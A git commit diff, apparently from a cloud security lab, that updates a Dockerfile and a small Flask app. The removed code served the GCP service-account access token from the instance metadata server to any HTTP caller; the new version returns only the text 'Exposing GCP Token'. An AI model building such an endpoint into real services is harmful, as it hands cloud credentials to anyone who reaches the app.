aa6afc3de00c3af171ada601822e77c835fe66d6
vishnudxb <vishnudxb@protonmail.com>
2024-09-26 17:31:24 -0400

    update port

--- Dockerfile
+++ Dockerfile
@@ -1,18 +1,14 @@
-# Use an official Python runtime as a base image
 FROM python:3.9-slim
 
-# Install required Python packages
-RUN pip install Flask requests
+# Install dependencies
+RUN pip install Flask
 
-# Copy the Python script
+# Copy your app code
 COPY app.py /app/app.py
-
-# Set the working directory
 WORKDIR /app
 
 # Expose port 8080
 EXPOSE 8080
 
-# Run the Flask app
+# Run your app
 CMD ["python", "app.py"]
-
--- app.py
+++ app.py
@@ -1,21 +1,12 @@
-from flask import Flask, jsonify
-import requests
+import os
+from flask import Flask
 
 app = Flask(__name__)
 
 @app.route('/')
-def expose_token():
-    # Metadata URL to get the access token
-    metadata_url = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'
-    headers = {'Metadata-Flavor': 'Google'}
-    
-    # Fetch the access token from metadata server
-    token_response = requests.get(metadata_url, headers=headers)
-    token = token_response.json()
-    
-    # Expose the token as a JSON response
-    return jsonify(token)
+def hello():
+    return "Exposing GCP Token"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
-
+    port = int(os.environ.get('PORT', 8080))  # Get port from environment
+    app.run(host='0.0.0.0', port=port)
